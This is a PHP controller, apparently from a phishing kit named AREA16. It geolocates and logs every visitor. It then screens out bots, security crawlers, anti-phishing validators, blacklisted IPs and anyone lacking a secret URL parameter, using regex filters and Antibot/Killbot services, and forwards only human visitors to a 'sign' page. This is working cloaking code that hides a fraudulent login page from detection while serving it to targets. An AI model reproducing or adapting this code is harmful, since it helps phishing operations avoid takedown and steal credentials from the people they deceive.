<?php 
defined("ACCESS") or die('Konz');

class Home 
{
	private $_LICENSE = FCPATH . "AREA16/system/private/license.ini";
	private $_CONFIG = FCPATH. "AREA16/system/private/setting.json";

	public function __construct()
	{
		$this->pc = new Pc();
		$_ini_file = parse_ini_file($this->_LICENSE);
		$this->license = new license($_ini_file);

		$getInfo = _geoGet($this->pc->ip_address);

		foreach($getInfo as $k => $v)
		{
			$_SESSION[$k] = $v;
		}
	}

	public function index()
	{	
		if(blackbox($this->pc->ip_address)) {
			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Blocked by Blackbox|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}
		
		if(preg_match("/bot|crawler|spider|aws|curl|slurp|phish|search|libwww-perl|python|archiver|transcoder|spider|uptime|validator|fetcher|cron|check|reader|extractor|monitoring|analyz/",$_SERVER['HTTP_USER_AGENT'])) {
			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Blocked by Area16|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}

		if ($this->pc->is_robot) {
			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Blocked by Area16|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (!isset($_GET[_config('parameter')])) {
			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Access Page Without Parameter|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}

		if (!empty(_config('antibot'))){
			if(antibot($this->pc->ip_address, $this->pc->agent)) {
				$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Blocked by Antibot|"._time()."", "BOT");
				write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
				_blocks();
				redirect(uriRand());
			}
		}

		if (!empty(_config('killbot'))){
			if(killbot($this->pc->ip_address, $this->pc->agent)) {
				$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Blocked by Killbot|"._time()."", "BOT");
				write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
				_blocks();
				redirect(uriRand());
			}
		}

		$_SESSION['access'] = 1;
		$this->license->create_logs("Human|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Visit Apps|"._time()."", "VISITOR");

		redirect(base_url() . 'sign');
	}
}